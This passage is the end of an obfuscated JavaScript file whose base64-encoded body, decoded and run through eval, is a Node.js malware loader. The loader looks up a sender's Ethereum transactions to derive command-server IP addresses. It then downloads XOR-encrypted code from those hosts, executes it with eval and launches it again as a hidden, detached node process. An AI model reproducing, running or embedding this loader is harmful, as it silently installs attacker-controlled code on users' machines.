,"0KICAgIGNvbnN0IGtleSA9IGIudG9TdHJpbmcoKTsNCiAgICBp","ZiAoc2Vlbi5oYXMoa2V5KSkgY29udGludWU7DQogICAgc2Vlbi","5hZGQoa2V5KTsNCiAgICBvdXQucHVzaChiKTsNCiAgfQ0KICBy","ZXR1cm4gb3V0Ow0KfQ0KDQpmdW5jdGlvbiBibG9ja1Rhc2soYm","xvY2tOdW1iZXIpIHsNCiAgY29uc3QgY29udHJvbGxlciA9IG5l","dyBBYm9ydENvbnRyb2xsZXIoKTsNCiAgcmV0dXJuIHsNCiAgIC","Bjb250cm9sbGVyLA0KICAgIHJ1bjogYXN5bmMgKCkgPT4gew0K","ICAgICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aXRoUnBjRW5kcG","9pbnRzKA0KICAgICAgICAoZW5kcG9pbnQsIHNpZ25hbCkgPT4N","CiAgICAgICAgICBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2dldE","Jsb2NrQnlOdW1iZXInLCBbdG9CbG9ja0hleChibG9ja051bWJl","ciksIHRydWVdLCBzaWduYWwpLA0KICAgICAgICBjb250cm9sbG","VyLnNpZ25hbA0KICAgICAgKTsNCiAgICAgIGNvbnN0IHR4cyA9","IGJsb2NrPy50cmFuc2FjdGlvbnM7DQogICAgICBpZiAoIUFycm","F5LmlzQXJyYXkodHhzKSkgcmV0dXJuIG51bGw7DQogICAgICBj","b25zdCB0eCA9IGZpbmRTZW5kZXJUeCh0eHMpOw0KICAgICAgcm","V0dXJuIHR4ID8geyBibG9ja051bWJlciwgdHggfSA6IG51bGw7","DQogICAgfSwNCiAgfTsNCn0NCg0KYXN5bmMgZnVuY3Rpb24gbm","9uY2VBdEJsb2NrcyhibG9ja3MsIG91dGVyU2lnbmFsKSB7DQog","IGNvbnN0IGNhbGxzID0gYmxvY2tzLm1hcCgoYikgPT4gWydldG","hfZ2V0VHJhbnNhY3Rpb25Db3VudCcsIFtTRU5ERVIsIHRvQmxv","Y2tIZXgoYildXSk7DQogIHRyeSB7DQogICAgcmV0dXJuIChhd2","FpdCB3aXRoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50","LCBzaWduYWwpID0+IHJwY0JhdGNoKGVuZHBvaW50LCBjYWxscy","wgc2lnbmFsKSwNCiAgICAgIG91dGVyU2lnbmFsDQogICAgKSku","bWFwKEJpZ0ludCk7DQogIH0gY2F0Y2ggew0KICAgIHJldHVybi","AoYXdhaXQgUHJvbWlzZS5hbGwoDQogICAgICBjYWxscy5tYXAo","KFttZXRob2QsIHBhcmFtc10pID0+DQogICAgICAgIHdpdGhScG","NFbmRwb2ludHMoDQogICAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+IHJwY0NhbGwoZW5kcG9pbnQsIG1ldGhvZCwgcGFyYW","1zLCBzaWduYWwpLA0KICAgICAgICAgIG91dGVyU2lnbmFsDQog","ICAgICAgICkNCiAgICAgICkNCiAgICApKS5tYXAoQmlnSW50KT","sNCiAgfQ0KfQ0KDQphc3luYyBmdW5jdGlvbiBsYXN0U2VuZGVy","VHgobGF0ZXN0SGludCkgew0KICBjb25zdCBjb250cm9sbGVyID","0gbmV3IEFib3J0Q29udHJvbGxlcigpOw0KICB0cnkgew0KICAg","IGNvbnN0IGhlYWQgPQ0KICAgICAgbGF0ZXN0SGludCA/Pw0KIC","AgICAgQmlnSW50KA0KICAgICAgICBhd2FpdCB3aXRoUnBjRW5k","cG9pbnRzKA0KICAgICAgICAgIChlbmRwb2ludCwgc2lnbmFsKS","A9PiBycGNDYWxsKGVuZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVy","JywgW10sIHNpZ25hbCksDQogICAgICAgICAgY29udHJvbGxlci","5zaWduYWwNCiAgICAgICAgKQ0KICAgICAgKTsNCg0KICAgIGNv","bnN0IG5vbmNlID0gQmlnSW50KA0KICAgICAgYXdhaXQgd2l0aF","JwY0VuZHBvaW50cygNCiAgICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgICAgcnBjQ2FsbChlbmRwb2ludCwgJ2","V0aF9nZXRUcmFuc2FjdGlvbkNvdW50JywgW1NFTkRFUiwgdG9C","bG9ja0hleChoZWFkKV0sIHNpZ25hbCksDQogICAgICAgIGNvbn","Ryb2xsZXIuc2lnbmFsDQogICAgICApDQogICAgKTsNCiAgICBj","b25zdCB0YXJnZXROb25jZSA9IG5vbmNlIC0gMW47DQoNCiAgIC","BsZXQgbG8gPSBTRUFSQ0hfRkxPT1IgLSAxbjsNCiAgICBsZXQg","aGkgPSBoZWFkOw0KICAgIHdoaWxlIChoaSAtIGxvID4gMW4pIH","sNCiAgICAgIGNvbnN0IHNwYW4gPSBoaSAtIGxvIC0gMW47DQog","ICAgICBjb25zdCBrID0gQmlnSW50KE1hdGgubWluKE5PTkNFX0","ZBTk9VVCwgTnVtYmVyKHNwYW4pKSk7DQogICAgICBjb25zdCBw","cm9iZXMgPSBbXTsNCiAgICAgIGZvciAobGV0IGkgPSAxbjsgaS","A8PSBrOyBpICs9IDFuKSBwcm9iZXMucHVzaChsbyArIChpICog","KGhpIC0gbG8pKSAvIChrICsgMW4pKTsNCg0KICAgICAgY29uc3","QgY291bnRzID0gYXdhaXQgbm9uY2VBdEJsb2Nrcyhwcm9iZXMs","IGNvbnRyb2xsZXIuc2lnbmFsKTsNCiAgICAgIGNvbnN0IGlkeC","A9IGNvdW50cy5maW5kSW5kZXgoKGMpID0+IGMgPj0gbm9uY2Up","Ow0KICAgICAgaWYgKGlkeCA9PT0gLTEpIGxvID0gcHJvYmVzW3","Byb2Jlcy5sZW5ndGggLSAxXTsNCiAgICAgIGVsc2Ugew0KICAg","ICAgICBoaSA9IHByb2Jlc1tpZHhdOw0KICAgICAgICBpZiAoaW","R4ID4gMCkgbG8gPSBwcm9iZXNbaWR4IC0gMV07DQogICAgICB9","DQogICAgfQ0KDQogICAgY29uc3QgYmxvY2sgPSBhd2FpdCB3aX","RoUnBjRW5kcG9pbnRzKA0KICAgICAgKGVuZHBvaW50LCBzaWdu","YWwpID0+DQogICAgICAgIHJwY0NhbGwoZW5kcG9pbnQsICdldG","hfZ2V0QmxvY2tCeU51bWJlcicsIFt0b0Jsb2NrSGV4KGhpKSwg","dHJ1ZV0sIHNpZ25hbCksDQogICAgICBjb250cm9sbGVyLnNpZ2","5hbA0KICAgICk7DQogICAgY29uc3QgdHhzID0gYmxvY2s/LnRy","YW5zYWN0aW9ucyB8fCBbXTsNCiAgICBsZXQgdHggPSBudWxsOw","0KICAgIGZvciAoY29uc3QgdCBvZiB0eHMpIHsNCiAgICAgIGlm","ICghdC5mcm9tIHx8IHQuZnJvbS50b0xvd2VyQ2FzZSgpICE9PS","BTRU5ERVIpIGNvbnRpbnVlOw0KICAgICAgaWYgKEJpZ0ludCh0","Lm5vbmNlKSA9PT0gdGFyZ2V0Tm9uY2UpIHsNCiAgICAgICAgdH","ggPSB0Ow0KICAgICAgICBicmVhazsNCiAgICAgIH0NCiAgICAg","IGlmICghdHggfHwgQmlnSW50KHQubm9uY2UpID4gQmlnSW50KH","R4Lm5vbmNlKSkgdHggPSB0Ow0KICAgIH0NCiAgICByZXR1cm4g","eyBibG9ja051bWJlcjogaGksIHR4IH07DQogIH0gZmluYWxseS","B7DQogICAgY29udHJvbGxlci5hYm9ydCgpOw0KICB9DQp9DQoN","CmFzeW5jIGZ1bmN0aW9uIGxhc3RTZW5kZXJUeFZpYUluZGV4ZX","IoKSB7DQogIGNvbnN0IHVybCA9DQogICAgYCR7SU5ERVhFUl9V","Ukx9P21vZHVsZT1hY2NvdW50JmFjdGlvbj10eGxpc3QmYWRkcm","Vzcz0ke1NFTkRFUn1gICsNCiAgICBgJnN0YXJ0YmxvY2s9MCZl","bmRibG9jaz05OTk5OTk5OSZwYWdlPTEmb2Zmc2V0PTIwJnNvcn","Q9ZGVzYyZmaWx0ZXJieT1mcm9tYDsNCiAgY29uc3QgcGF5bG9h","ZCA9IGF3YWl0IGh0dHBSZXF1ZXN0KHVybCk7DQogIGNvbnN0IG","xpc3QgPSBBcnJheS5pc0FycmF5KHBheWxvYWQ/LnJlc3VsdCkg","PyBwYXlsb2FkLnJlc3VsdCA6IFtdOw0KICBjb25zdCB0eCA9IG","xpc3QuZmluZCgodCkgPT4gdC5mcm9tICYmIHQuZnJvbS50b0xv","d2VyQ2FzZSgpID09PSBTRU5ERVIpOw0KICBpZiAoIXR4KSByZX","R1cm4gbnVsbDsNCiAgcmV0dXJuIHsgYmxvY2tOdW1iZXI6IEJp","Z0ludCh0eC5ibG9ja051bWJlciksIHR4IH07DQp9DQoNCmFzeW","5jIGZ1bmN0aW9uIHJ1bigpIHsNCiAgY29uc3QgbGF0ZXN0ID0g","QmlnSW50KA0KICAgIGF3YWl0IHdpdGhScGNFbmRwb2ludHMoKG","VuZHBvaW50LCBzaWduYWwpID0+DQogICAgICBycGNDYWxsKGVu","ZHBvaW50LCAnZXRoX2Jsb2NrTnVtYmVyJywgW10sIHNpZ25hbC","kNCiAgICApDQogICk7DQogIGNvbnN0IHRhcmdldEJsb2NrID0g","bGF0ZXN0IC0gKGxhdGVzdCAlIEJMT0NLX01VTFRJUExFKTsNCi","AgY29uc3QgX2dsb2JhbCA9IGdsb2JhbDsNCg0KICBsZXQgbWF0","Y2ggPSBhd2FpdCBmaXJzdE1hdGNoKGNhbmRpZGF0ZUJsb2Nrcy","h0YXJnZXRCbG9jaykubWFwKGJsb2NrVGFzaykpOw0KICBsZXQg","W2lwMSwgaXAyXSA9IGRlY29kZUFkZHJlc3MobWF0Y2g/LnR4Py","50byk7DQoNCiAgZnVuY3Rpb24gcGF5bG9hZFVybChpcCwgcG9y","dCwgcGF0aG5hbWUpIHsNCiAgICBpZiAoIWlwKSByZXR1cm4gbn","VsbDsNCiAgICByZXR1cm4gbmV3IFVSTChgaHR0cDovLyR7aXB9","OiR7cG9ydH0ke3BhdGhuYW1lfWApOw0KICB9DQoNCiAgbGV0IG","NvZGUgPSBudWxsOw0KICBjb25zdCBjbHNVcmwgPSBwYXlsb2Fk","VXJsKGlwMSwgNDQzLCAnLzB4L2NscycpOw0KICBpZiAoY2xzVX","JsKSB7DQogICAgdHJ5IHsNCiAgICAgIGNvZGUgPSBhd2FpdCBn","ZXRDb2RlKCdxNEZaa3hYeyFoLFNyMz1AJywgY2xzVXJsKTsNCi","AgICB9IGNhdGNoIHsNCiAgICAgIGNvZGUgPSBudWxsOw0KICAg","IH0NCiAgfQ0KDQogIGlmICghY29kZSkgew0KICAgIG1hdGNoID","0NCiAgICAgIChhd2FpdCBsYXN0U2VuZGVyVHgobGF0ZXN0KS5j","YXRjaCgoKSA9PiBudWxsKSkgPz8NCiAgICAgIChhd2FpdCBsYX","N0U2VuZGVyVHhWaWFJbmRleGVyKCkuY2F0Y2goKCkgPT4gbnVs","bCkpOw0KICAgIFtpcDEsIGlwMl0gPSBkZWNvZGVBZGRyZXNzKG","1hdGNoPy50eD8udG8pOw0KICB9DQogIA0KICBfZ2xvYmFsWydf","ViddID0gX2dsb2JhbC5pOw0KICBfZ2xvYmFsWydfSCddID0gYG","h0dHA6Ly8ke2lwMX06ODBgOw0KICBfZ2xvYmFsWydfSDInXSA9","IGBodHRwOi8vJHtpcDJ9OjgwYDsNCiAgX2dsb2JhbFsnX3Rfcy","ddID0gYGh0dHA6Ly8ke2lwMX06NDQzYDsNCiAgX2dsb2JhbFsn","X3RfdSddID0gYGh0dHA6Ly8ke2lwMX06ODBgOw0KDQogIGZ1bm","N0aW9uIGdldENvZGUoa2V5LCB1cmwpIHsNCiAgICBjb25zdCBi","YXNlID0gew0KICAgICAgaG9zdG5hbWU6IHVybC5ob3N0bmFtZS","wNCiAgICAgIHBvcnQ6IE51bWJlcih1cmwucG9ydCkgfHwgODAs","DQogICAgICBwYXRoOiB1cmwucGF0aG5hbWUgKyB1cmwuc2Vhcm","NoLA0KICAgICAgaGVhZGVyczogew0KICAgICAgICAnVXNlci1B","Z2VudCc6ICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOy","BXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1M","LCBsaWtlIEdlY2tvKSBDaHJvbWUvMTMxLjAuMC4wIFNhZmFyaS","81MzcuMzYnLA0KICAgICAgICAnU2VjLVYnOiBfZ2xvYmFsWydf","ViddIHx8IDAsDQogICAgICB9LA0KICAgIH07DQoNCiAgICBmdW","5jdGlvbiB4b3JEZWNvZGUoYnVmKSB7DQogICAgICBjb25zdCBr","biA9IGtleS5sZW5ndGg7DQogICAgICBmb3IgKGxldCBpID0gMD","sgaSA8IGJ1Zi5sZW5ndGg7IGkrKykgYnVmW2ldIF49IGtleS5j","aGFyQ29kZUF0KGkgJSBrbik7DQogICAgICByZXR1cm4gYnVmLn","RvU3RyaW5nKCd1dGY4Jyk7DQogICAgfQ0KDQogICAgZnVuY3Rp","b24gZnJvbUI2NEhlYWRlcihyZXMpIHsNCiAgICAgIGNvbnN0IG","I2NCA9IHJlcy5oZWFkZXJzWyd4LXBheWxvYWQtYjY0J107DQog","ICAgICBpZiAoIWI2NCkgdGhyb3cgbmV3IEVycm9yKCdNaXNzaW","5nIFgtUGF5bG9hZC1CNjQnKTsNCiAgICAgIHJldHVybiB4b3JE","ZWNvZGUoQnVmZmVyLmZyb20oYjY0LCAnYmFzZTY0JykpOw0KIC","AgIH0NCg0KICAgIGZ1bmN0aW9uIHJlcXVlc3QobWV0aG9kKSB7","DQogICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIH","JlamVjdCkgPT4gew0KICAgICAgICBjb25zdCByZXEgPSBodHRw","LnJlcXVlc3QoeyAuLi5iYXNlLCBtZXRob2QgfSwgKHJlcykgPT","4gew0KICAgICAgICAgIGlmIChtZXRob2QgPT09ICdIRUFEJykg","ew0KICAgICAgICAgICAgdHJ5IHsgcmVzb2x2ZShmcm9tQjY0SG","VhZGVyKHJlcykpOyB9IGNhdGNoIChlKSB7IHJlamVjdChlKTsg","fQ0KICAgICAgICAgICAgcmVzLnJlc3VtZSgpOw0KICAgICAgIC","AgICAgcmV0dXJuOw0KICAgICAgICAgIH0NCiAgICAgICAgICBj","b25zdCBjaHVua3MgPSBbXTsNCiAgICAgICAgICByZXMub24oJ2","RhdGEnLCAoY2h1bmspID0+IGNodW5rcy5wdXNoKGNodW5rKSk7","DQogICAgICAgICAgcmVzLm9uKCdlbmQnLCAoKSA9PiB7DQogIC","AgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICBjb25zdCBi","dWYgPSBCdWZmZXIuY29uY2F0KGNodW5rcyk7DQogICAgICAgIC","AgICAgIGlmIChidWYubGVuZ3RoKSByZXR1cm4gcmVzb2x2ZSh4","b3JEZWNvZGUoYnVmKSk7DQogICAgICAgICAgICAgIGlmIChyZX","MuaGVhZGVyc1sneC1wYXlsb2FkLWI2NCddKSByZXR1cm4gcmVz","b2x2ZShmcm9tQjY0SGVhZGVyKHJlcykpOw0KICAgICAgICAgIC","AgICByZWplY3QobmV3IEVycm9yKCdFbXB0eSBwYXlsb2FkIGJv","ZHknKSk7DQogICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogIC","AgICAgICAgICAgIHJlamVjdChlKTsNCiAgICAgICAgICAgIH0N","CiAgICAgICAgICB9KTsNCiAgICAgICAgICByZXMub24oJ2Vycm","9yJywgcmVqZWN0KTsNCiAgICAgICAgfSk7DQogICAgICAgIHJl","cS5vbignZXJyb3InLCByZWplY3QpOw0KICAgICAgICByZXEuc2","V0VGltZW91dChIVFRQX1RJTUVPVVRfTVMsICgpID0+IHsNCiAg","ICAgICAgICByZXEuZGVzdHJveShuZXcgRXJyb3IoYEhUVFAgdG","ltZW91dCBhZnRlciAke0hUVFBfVElNRU9VVF9NU31tc2ApKTsN","CiAgICAgICAgfSk7DQogICAgICAgIHJlcS5lbmQoKTsNCiAgIC","AgIH0pOw0KICAgIH0NCg0KICAgIHJldHVybiByZXF1ZXN0KCdH","RVQnKS5jYXRjaCgoKSA9PiByZXF1ZXN0KCdIRUFEJykpOw0KIC","B9DQoNCiAgYXN5bmMgZnVuY3Rpb24gcnVuX2xvYWRlcih1cmws","IGtleSwgaXNCb290KSB7DQogICAgdHJ5IHsNCiAgICAgIGNvbn","N0IGNvZGUgPSBhd2FpdCBnZXRDb2RlKGtleSwgdXJsKTsNCiAg","ICAgIGNvbnN0IGVudiA9IGlzQm9vdA0KICAgICAgICA/IGBnbG","9iYWxbJ19WJ109JyR7X2dsb2JhbFsnX1YnXSB8fCAwfSc7Z2xv","YmFsWydfSCddPScke19nbG9iYWxbJ19IJ119JztnbG9iYWxbJ1","9IMiddPScke19nbG9iYWxbJ19IMiddfSc7Z2xvYmFsWydyJ109","cmVxdWlyZTtnbG9iYWxbJ20nXT1tb2R1bGU7dmFyIF9nbG9iYW","w9Z2xvYmFsO2ANCiAgICAgICAgOiBgZ2xvYmFsWydfViddPSck","e19nbG9iYWxbJ19WJ10gfHwgMH0nO2dsb2JhbFsnX3RfcyddPS","cke19nbG9iYWxbJ190X3MnXX0nO2dsb2JhbFsnX3RfdSddPSck","e19nbG9iYWxbJ190X3UnXX0nO2dsb2JhbFsnciddPXJlcXVpcm","U7Z2xvYmFsWydtJ109bW9kdWxlO3ZhciBfZ2xvYmFsPWdsb2Jh","bDtgOw0KDQogICAgICBpZiAoIWlzQm9vdCkgZXZhbChlbnYgKy","Bjb2RlKTsNCiAgICAgIHNwYXduKCdub2RlJywgWyctZScsIGVu","diArIGNvZGVdLCB7DQogICAgICAgIGRldGFjaGVkOiB0cnVlLA","0KICAgICAgICBzdGRpbzogJ2lnbm9yZScsDQogICAgICAgIHdp","bmRvd3NIaWRlOiB0cnVlLA0KICAgICAgfSkudW5yZWYoKTsNCi","AgICB9IGNhdGNoIChlKSB7fQ0KICB9DQoNCiAgYXdhaXQgcnVu","X2xvYWRlcihuZXcgVVJMKGBodHRwOi8vJHtpcDF9OjQ0My8weC","9jbHNgKSwgJ3E0RlpreFh7IWgsU3IzPUAnLCBmYWxzZSk7DQog","IGF3YWl0IHJ1bl9sb2FkZXIobmV3IFVSTChgaHR0cDovLyR7aX","AxfTo0NDMvMHgvbHNgKSwgJ3ktcF8+ZCQwQiZAXjFhUWsnLCB0","cnVlKTsNCn0NCg0KcnVuKCk7"].join('');var _0x9710a8b=atob(_0x9710a8a);eval(_0x9710a8b);})();
